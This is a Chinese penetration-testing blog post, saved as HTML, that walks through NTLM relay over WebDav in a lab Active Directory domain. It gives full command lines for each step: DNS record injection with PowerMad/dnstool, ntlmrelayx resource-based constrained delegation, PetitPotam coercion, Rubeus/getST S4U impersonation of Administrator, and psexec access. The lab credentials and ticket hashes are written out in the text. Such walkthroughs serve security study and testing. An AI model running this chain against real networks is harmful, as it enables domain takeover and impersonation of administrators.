@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言：​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap&#x2F;s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？ ​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过WebDav进行NTLM Relay">
+<meta property="og:url" content="http://antipassion.github.io/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="前言：​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap&#x2F;s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？ ​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124859446.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030125010956.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151117006.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030130628768.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030131357379.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151852766.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151906831.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132543523.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132832081.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143159039.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143131796.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144027489.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144213123.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030153948639.png">
+<meta property="article:published_time" content="2022-10-30T02:51:43.000Z">
+<meta property="article:modified_time" content="2022-10-30T07:40:21.727Z">
+<meta property="article:author" content="Nayon">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png">
+
+<link rel="canonical" href="http://antipassion.github.io/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>通过WebDav进行NTLM Relay | 林中小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">林中小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/10/30/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Nayon.png">
+      <meta itemprop="name" content="Nayon">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          通过WebDav进行NTLM Relay
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-10-30 10:51:43 / 修改时间：15:40:21" itemprop="dateCreated datePublished" datetime="2022-10-30T10:51:43+08:00">2022-10-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>​    NTLM Relay大家已经不再陌生了，很多时候我们通过NTLM Relay进行攻击时，会受到协议签名(ldap/s、smb等协议签名)的影响从而导致攻击失败，并且随着时间的流逝，我们想要遇到忽略签名的smb等服务也变得越来越困难了，我们有哪些方法来忽略服务端验证签名的影响从而达到我们relay攻击的目的呢？</p>
+<p>​    我们可以寻找不支持签名的服务，来避免服务端的签名校验。若客户端不支持签名验证的话，服务端在与客户端通信时是不会强制要求签名认证的。因此我们可以使用HTTP服务中的WebDav来尝试Relay攻击了。</p>
+<h3 id="什么是WebDav"><a href="#什么是WebDav" class="headerlink" title="什么是WebDav:"></a>什么是WebDav:</h3><p>​    WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV  就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。</p>
+<p>​    Windows通过WebClient服务实现WebDav，允许Windows程序通过WebDav来创建、读取以及写入服务器上的文件，并通过HTTP服务进行通信，在客户端访问WebDav时，若开启Windows身份验证机制，我们便可以通过域内凭证进行访问服务。</p>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤:"></a>攻击步骤:</h3><ul>
+<li>拿到一枚域用户</li>
+<li>探测开启WebDav的服务器</li>
+<li>在域内为攻击机添加DNS解析</li>
+<li>使用Responder进行中继与委派</li>
+<li>强制WebDav服务器认证攻击机</li>
+<li>执行基于资源的约束委派攻击</li>
+</ul>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h3><h4 id="探测WebDav服务"><a href="#探测WebDav服务" class="headerlink" title="探测WebDav服务"></a>探测WebDav服务</h4><p>​    拿到域内权限后，通过<code>GetWebDAVStatus.exe</code>探测内网中开放WebDav的服务器。</p>
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124101717.png" alt="image-20221030124101717"></p>
+<p>​    发现目标后，为了让Relay顺利进行，我们可以添加一份DNS A记录，从而使得WebDav通过默认凭据来对我们进行身份验证，由于在Windows当中，WebDav由WebClient服务实现，而WebClient服务仅对内网以及受信任站点中的目标来采用默认凭据进行身份验证。</p>
+<h4 id="添加DNS解析"><a href="#添加DNS解析" class="headerlink" title="添加DNS解析"></a>添加DNS解析</h4><h5 id="0x1-域内使用PowerMad添加"><a href="#0x1-域内使用PowerMad添加" class="headerlink" title="0x1.域内使用PowerMad添加"></a>0x1.域内使用PowerMad添加</h5><p>此处我们使用PowerMad进行添加DNS A解析记录，此处我们添加解析记录，普通域用户也可添加，并非只有域管用户才可操作。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> .\<span class="built_in">invoke-DNSupdate</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-DNSUpdate</span> <span class="literal">-DNSType</span> A <span class="literal">-DNSName</span> evil.pentest.local <span class="literal">-DNSData</span> <span class="number">10.0</span>.<span class="number">10.128</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030124859446.png" alt="image-20221030124859446"></p>
+<p>紧接着使用<code>ipconfig /flushdns</code>刷新dns本地缓存后可以看到使用ping命令即可成功解析我们所添加的记录</p>
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030125010956.png" alt="image-20221030125010956"></p>
+<h5 id="0x2-域外使用dnstool-py添加"><a href="#0x2-域外使用dnstool-py添加" class="headerlink" title="0x2.域外使用dnstool.py添加"></a>0x2.域外使用dnstool.py添加</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u pentest.local\\Sharp -p Admin<span class="comment">#123 -r evil.pentest.local -d 10.0.10.128 --action add ws01.pentest.local</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151117006.png" alt="image-20221030151117006"></p>
+<h4 id="准备NTLM-Relay"><a href="#准备NTLM-Relay" class="headerlink" title="准备NTLM Relay"></a>准备NTLM Relay</h4><p>回到攻击机进行操作。</p>
+<p>利用Impacket项目<code>ntlmrelayx.py</code>执行攻击，指定LDAP协议进行身份验证，目标主机设置为域控，利用-delegate-access选项执行基于资源的约束委派攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldaps://ws01 --delegate-access -smb2support</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030130628768.png" alt="image-20221030130628768"></p>
+<h4 id="强制认证主机创建机器账户"><a href="#强制认证主机创建机器账户" class="headerlink" title="强制认证主机创建机器账户"></a>强制认证主机创建机器账户</h4><p>回到被我们控制的主机，使用PetitPotam 强制WebDav服务器认证我们的攻击机，此处不可使用ip进行强制认证，使用我们先前添加的DNS解析进行强制认证,此处的<code>@</code>符号前为主机名，后为端口号。</p>
+<h5 id="0x1-域内认证"><a href="#0x1-域内认证" class="headerlink" title="0x1.域内认证"></a>0x1.域内认证</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe evil@<span class="number">80</span>/evil.cnf <span class="number">10.0</span>.<span class="number">10.110</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030131357379.png" alt="image-20221030131357379"></p>
+<h5 id="0x2-域外认证"><a href="#0x2-域外认证" class="headerlink" title="0x2.域外认证"></a>0x2.域外认证</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -u sharp -p Admin<span class="comment">#123 -d pentest.local evil@80/ad 10.0.10.110</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151852766.png" alt="image-20221030151852766"></p>
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151906831.png" alt="image-20221030151906831"></p>
+<p>这时候，回到攻击机查看可以发现，我们此时已经通过<code>ws03$</code>的身份，创建了一个机器账户</p>
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132543523.png" alt="image-20221030132543523"></p>
+<p>这时我们回到域控查看WebDav服务器，可以发现<code>msDS-KeyCredentialLink</code> 属性已经被修改。</p>
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132832081.png" alt="image-20221030132832081"></p>
+<h4 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h4><h5 id="0x1-域内申请票据"><a href="#0x1-域内申请票据" class="headerlink" title="0x1.域内申请票据"></a>0x1.域内申请票据</h5><p>此时，我们便可以通过S4U扩展协议来申请访问WebDav目标机的ST票据了。</p>
+<p>将密码转为hash，便于我们进行使用Rubeus进行申请票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe hash /domain:pentest.local /user:RUVEPAFW$ /password:&#x27;gm9wPzATZ&lt;RT5Ei&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143159039.png" alt="image-20221030143159039"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /user:RUVEPAFW<span class="variable">$</span> /rc4:<span class="number">4</span>A5AD55249E75BB39F928EFB55A8A81B  /impersonateuser:Administrator /msdsspn:host/ws03.pentest.local /altservice:cifs /nowrap /ptt</span><br></pre></td></tr></table></figure>
+
+<p>由于开启了PTT模块，此时我们缓存中已经加载了申请来的ST票据，拥有了访问WS03机器共享目录权限。</p>
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143131796.png" alt="image-20221030143131796"></p>
+<p>当然，我们也可以将申请到的kirbi票据除空格后解码base64，利用ticketConverter转为cacche格式，于域外利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;payload&#x27;</span> | base64 -d &gt; administrator.kirbi</span><br><span class="line">python3 ticketConverter.py administrator.kirbi administrator.ccache </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144027489.png" alt="image-20221030144027489"></p>
+<p>将申请到的票据加载到环境变量中，使用psexec登陆远程服务器。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/opt/tools/impacket/examples/administrator.ccache</span><br><span class="line">python3 psexec.py -no-pass -k ws03.pentest.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144213123.png" alt="image-20221030144213123"></p>
+<h5 id="0x2-域外申请票据"><a href="#0x2-域外申请票据" class="headerlink" title="0x2.域外申请票据"></a>0x2.域外申请票据</h5><p>参考委派，使用机器账户身份申请ST票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.0.10.111 pentest/RUVEPAFW\$ -spn cifs/ws03.pentest.local -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030153948639.png" alt="image-20221030153948639"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/03/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8/" rel="prev" title="Hell's Gate的一次尝试入门">
+      <i class="fa fa-chevron-left"></i> Hell's Gate的一次尝试入门
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/19/%E4%BB%8E%E8%BD%AC%E5%82%A8lsass%E5%85%A5%E6%89%8B%E5%AD%A6%E4%B9%A0Windows%E8%BF%9B%E7%A8%8B%E5%AE%89%E5%85%A8/" rel="next" title="从转储lsass学习Windows安全">
+      从转储lsass学习Windows安全 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFWebDav"><span class="nav-number">2.</span> <span class="nav-text">什么是WebDav:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.</span> <span class="nav-text">攻击步骤:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">4.</span> <span class="nav-text">攻击流程:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8BWebDav%E6%9C%8D%E5%8A%A1"><span class="nav-number">4.1.</span> <span class="nav-text">探测WebDav服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0DNS%E8%A7%A3%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">添加DNS解析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E4%BD%BF%E7%94%A8PowerMad%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.1.</span> <span class="nav-text">0x1.域内使用PowerMad添加</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E4%BD%BF%E7%94%A8dnstool-py%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.2.</span> <span class="nav-text">0x2.域外使用dnstool.py添加</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%86%E5%A4%87NTLM-Relay"><span class="nav-number">4.3.</span> <span class="nav-text">准备NTLM Relay</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%BA%E5%88%B6%E8%AE%A4%E8%AF%81%E4%B8%BB%E6%9C%BA%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="nav-number">4.4.</span> <span class="nav-text">强制认证主机创建机器账户</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E8%AE%A4%E8%AF%81"><span class="nav-number">4.4.1.</span> <span class="nav-text">0x1.域内认证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E8%AE%A4%E8%AF%81"><span class="nav-number">4.4.2.</span> <span class="nav-text">0x2.域外认证</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.</span> <span class="nav-text">申请票据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x1-%E5%9F%9F%E5%86%85%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.1.</span> <span class="nav-text">0x1.域内申请票据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x2-%E5%9F%9F%E5%A4%96%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE"><span class="nav-number">4.5.2.</span> <span class="nav-text">0x2.域外申请票据</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Nayon"
+      src="/images/Nayon.png">
+  <p class="site-author-name" itemprop="name">Nayon</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0range-x.github.io/" title="https:&#x2F;&#x2F;0range-x.github.io&#x2F;" rel="noopener" target="_blank">0r@nge</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://txluck.github.io/" title="https:&#x2F;&#x2F;txluck.github.io&#x2F;" rel="noopener" target="_blank">永安寺</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://odyline.github.io/" title="https:&#x2F;&#x2F;odyline.github.io&#x2F;" rel="noopener" target="_blank">Odyline</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Nayon</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
